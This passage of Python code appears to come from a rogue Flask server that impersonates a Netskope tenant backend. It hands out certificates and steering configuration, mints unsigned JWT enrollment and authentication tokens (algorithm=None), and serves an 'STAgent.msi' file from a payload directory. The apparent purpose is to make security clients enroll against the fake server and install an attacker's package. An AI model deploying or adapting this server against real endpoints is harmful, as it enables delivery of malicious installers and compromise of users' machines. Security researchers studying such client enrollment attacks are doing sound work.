                "status": "success",
                "steering_config_name": "Test Steering Configuration"
            }
            return jsonify(data)

        @self.flask_app.route("/config/org/cert", methods=["GET"])
        def org_cert():
            return Response(self.get_org_cert(), mimetype='application/x-pem-file', 
                headers={'Content-Disposition': 'attachment; filename="cert.pem"'})

        @self.flask_app.route("/config/ca/cert", methods=["GET"])
        def ca_cert():
            return Response(self.get_ca_cert(), mimetype='application/x-pem-file', 
                headers={'Content-Disposition': 'attachment; filename="cert.pem"'})

        @self.flask_app.route("/v2/config/user/cert", methods=["GET"])
        def user_cert():
            return Response(self.get_user_cert(), mimetype='application/x-pkcs12', 
                headers={'Content-Disposition': 'attachment; filename="nsusercert.p12"'})

        @self.flask_app.route("/v1/steering/domains", methods=["GET"])
        def steering_domains():
            data = {
                "bwan_apps_enabled": 0,
                "bwan_apps_off_prem": 0,
                "bwan_apps_on_prem": 0,
                "bypass_option": 0,
                "domain_ports": {},
                "domains": [
                    self.tenant_config["addon_manager_host"],
                ],
                "dynamic_steering": 0,
                "offprem_bypass_option": 0,
                "offprem_steering_method": 0,
                "offprem_steering_method_none": 0,
                "onprem_bypass_option": 0,
                "onprem_steering_method": 0,
                "onprem_steering_method_none": 0,
                "private_apps_enabled": 1,
                "private_apps_enabled_specific": 0,
                "private_apps_off_prem": 0,
                "private_apps_off_prem_specific": 0,
                "private_apps_on_prem": 0,
                "private_apps_on_prem_specific": 0,
                "private_apps_other_steering_method": 0,
                "status": "success",
                "steering_config_name": "Test Steering Configuration",
                "steering_method_none": 0,
                "traffic_mode": "web"
            }
            return jsonify(data)

        @self.flask_app.route("/config/org/version", methods=["GET"])
        def org_version():
            return jsonify({"config_version": "2025-03-05 14:01:01.629725", "status": "success"})

        @self.flask_app.route("/netskope/generate_command", methods=["GET"])
        def generate_command():
            """
            Generate a JWT token for the enrollment request
            """
            token = jwt.encode(
                {
                    "Iss": "client",
                    "iat": int(time.time()),
                    "exp": int(time.time() + 3600),
                    "UserEmail": self.tenant_config["user_email"],
                    "OrgKey": self.tenant_config["orgkey"],
                    "AddonUrl": self.tenant_config["addon_manager_host"],
                    "TenantId": self.tenant_config["tenant_id"],
                    "nbf": int(time.time() - 3600),
                    "UTCEpoch": int(time.time()),
                },
                key=b"", algorithm=None)

            command = {
                "148": {
                    "tenantName": self.tenant_config["tenant_name"],
                    "idpTokenValue": token
                }
            }
            return jsonify(command)

        @self.flask_app.route("/dlr/<download_hash>", methods=["GET"])
        def download_client(download_hash):
            download_file = os.path.join(self.payload_dir, "STAgent.msi")
            if not os.path.exists(download_file):
                abort(404)
            return send_file(download_file, as_attachment=True)

        @self.flask_app.route('/nsauth/client/authenticate', methods=["POST", "GET"])
        def authenticate():
            token = jwt.encode(
                {
                    "Iss": "authsvc",
                    "OrgKey": self.tenant_config["orgkey"],
                    "UserEmail": self.tenant_config["user_email"],
                    "PopName": self.tenant_config["pop_name"],
                    "TenantId": self.tenant_config["tenant_id"],
                    "AddonUrl": self.tenant_config["addon_manager_host"],
                    "UTCEpoch": int(time.time()),
                    "nbf": int(time.time() - 3600),
                    "exp": int(time.time() + 3600),
                    "tenant_rotation_state": None,
                    "rotateCert": False,
                },
                key=b"", algorithm=None)
            html = self.render_template('auth.html', jwt_token=token)
            return Response(html, mimetype='text/html')

        @self.flask_app.route("/config/org/gettunnelpolicy", methods=["GET"])
        def gettunnelpolicy():
            return jsonify({"status":"success","tunnelPolicy":[]})
